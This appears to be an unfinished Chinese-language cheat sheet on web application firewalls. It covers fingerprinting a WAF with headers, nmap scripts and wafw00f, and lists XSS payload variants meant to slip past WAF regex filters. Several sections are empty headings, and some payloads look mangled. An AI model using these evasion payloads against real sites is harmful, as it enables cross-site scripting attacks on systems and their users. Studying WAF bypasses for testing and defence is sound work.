# Web Application Firewall (WAF)
https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2 <br>
## 手動識別 WAF
- WAF 的名稱Server 標題（例如Server: cloudflare）
- 與 WAF 相關的其他 HTTP 回應標頭（例如CF-RAY: xxxxxxxxxxx）
- 看似由 WAF 設定的 Cookie（例如回應標頭Set-Cookie: __cfduid=xxxxx）
- 提交惡意請求時的唯一回應代碼。 （例如412）
- 可以透過FIN/RST向伺服器發送 TCP 封包

## 自動化識別 WAF
1. Nmap
  - Nmap 腳本引擎 (NSE) 包含用於偵測和指紋辨識防火牆的腳本
  - $ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com
2. WafW00f
  - 命令列實用程序
  - $ wafw00f example.com
3. WhatWaf

# Bypassing WAFs
## Bypassing Regex
- 更改有效載荷的大小寫 :
    - <sCrIpT>alert(XSS)</sCriPt> 
- 使用各種編碼、替換函數或字元 :
    - 在前面加上一個額外的「<」:  << script>alert(XSS)</script >
    - 刪除結束標籤 :  <script>alert(XSS) //
    - 使用反引號取代代號代替 : <script>alert`XSS`</script>
- 使用其他語法以及使用換行符或製表符。
    - 雙開尖括號 : java%0ascript:alert ( http.com 
    - 不常見的標籤 : <"STYLE>.classname{background-image:url( "javascript:alert(XSS)" );/STYLE">
    - 需要繞過: <"img/src=1/onerror=alert(0)">
    - 額外字符 : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa href=javascript:alert(1)>xss</a">"

## Obfuscation 混淆 

## Charset 字元集

## Content Size 內容大小

## Unicode Compatibility

## Uninitialized Variables 未初始化
